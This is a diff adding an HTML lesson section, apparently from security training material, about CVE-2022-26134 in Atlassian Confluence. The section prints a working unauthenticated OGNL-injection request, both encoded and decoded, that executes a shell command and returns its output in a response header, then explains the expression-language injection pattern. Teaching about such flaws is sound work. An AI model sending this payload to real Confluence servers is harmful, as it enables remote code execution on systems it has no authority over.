@@ -1,0 +1,24 @@
+<section>
+  <h2 class="section-title">Real world &mdash; CVE-2022-26134 (Confluence)</h2>
+  <div class="textbox" style="border-color: rgba(239,68,68,0.45); background: rgba(239,68,68,0.05);">
+    <p><span class="inline-tag tag-red">Atlassian Confluence Server / Data Center</span> Unauthenticated OGNL injection in URL paths. CVSS 9.8. Active in-the-wild exploitation within 24h of disclosure (June 2022).</p>
+  </div>
+  <div class="card card-red full-width" style="margin-top: 14px;">
+    <div class="card-header">the request &mdash; OGNL right in the URL</div>
+    <pre><code class="language-text">GET /%24%7B(%23a%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%22id%22).getInputStream())).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Out%22%2C%23a))%7D/ HTTP/1.1
+Host: confluence.victim.tld
+
+# decoded:
+GET /${(#a=@org.apache.commons.io.IOUtils@toString(
+        @java.lang.Runtime@getRuntime().exec("id").getInputStream())).
+       (@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Out",#a))}/ HTTP/1.1
+
+# response:
+HTTP/1.1 302
+X-Out: uid=1000(confluence) gid=1000 groups=1000</code></pre>
+  </div>
+  <div class="textbox" style="margin-top: 14px;">
+    <p><span class="inline-tag tag-purple">Why it's SSTI</span> The URL path was being passed through OGNL evaluation &mdash; the same expression language used in legitimate templates &mdash; without proper context separation. <code>${...}</code> in the path got <em>executed</em>.</p>
+    <p><span class="inline-tag tag-cyan">Pattern, not an outlier</span> Spring4Shell (CVE-2022-22965), Atlassian Crowd, Liferay, ColdFusion &mdash; same shape: user input reaches an expression-language evaluator.</p>
+  </div>
+</section>
